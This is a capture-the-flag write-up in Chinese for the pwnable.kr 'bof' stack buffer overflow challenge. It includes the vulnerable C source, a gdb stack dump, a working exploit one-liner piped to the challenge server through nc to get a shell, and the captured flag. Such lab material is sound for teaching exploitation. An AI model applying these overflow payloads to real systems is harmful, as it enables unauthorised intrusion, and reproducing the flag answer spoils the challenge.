# Solution
## 描述
```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```
## 问题分析
下载`bof.c`如下
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
可以看到当`key == 0xcafebabe`时，可以获得`shell`，于是想办法令`key = 0xcafebabe`。

注意到使用了`gets`，这个函数不会检查输入长度，于是考虑使用溢出的方法，于是我们试图找到`overflowme`和`key`的地址，如果`overflowme`在`key`前面，则我们可以通过溢出的方式覆写`key`。

使用`gdb`调试`./bof`，执行到`gets`时，输入`XXXXXXXXXXXX`，定位`overflowme`的地址。考虑到函数内定义的局部变量和函数参数都在栈中，使用`x/50xw $sp`查看栈空间
```
(gdb) x/50xw $sp
0xffffcdc0:	0xffffcddc	0xffffce64	0xf7fb7000	0x0000c287
0xffffcdd0:	0xffffffff	0x0000002f	0xf7e13dc8	0x58585858
0xffffcde0:	0x58585858	0x58585858	0x00000000	0x5655549d
0xffffcdf0:	0x00000001	0x00000003	0x56556ff4	0x44e08c00
0xffffce00:	0xf7fb7000	0xf7fb7000	0xffffce28	0x5655569f
0xffffce10:	0xdeadbeef	0x56555250	0x565556b9	0x00000000
0xffffce20:	0xf7fb7000	0xf7fb7000	0x00000000	0xf7e1f637
0xffffce30:	0x00000001	0xffffcec4	0xffffcecc	0x00000000
0xffffce40:	0x00000000	0x00000000	0xf7fb7000	0xf7ffdc04
0xffffce50:	0xf7ffd000	0x00000000	0xf7fb7000	0xf7fb7000
0xffffce60:	0x00000000	0xcbe7cffe	0xf79041ee	0x00000000
0xffffce70:	0x00000000	0x00000000	0x00000001	0x56555530
0xffffce80:	0x00000000	0xf7feeff0
```
找到`0xdeadbeef`在`0xffffce10`，于是`key`的地址是`0xffffce10`

然后找12个连续的`58`，以此定位`overflowme`的地址是`0xffffcddc`

于是只需要令输入串等于`52`个任意字符加上`0xcafebabe`就可以取得`shell`了

## 问题解决
使用python生成攻击字符串，用管道输入到`nc`中即可。使用命令`(python -c 'print "X" * 52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000`，注意管道的前边不止有生成字符串的脚本，还有`cat`命令，因为我们只是得到了`shell`，还需要`cat`向远端的`shell`输入命令

然后输入`cat flag`即可

```
~$ (python -c 'print "X" * 52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000
$ cat flag
daddy, I just pwned a buFFer :)
```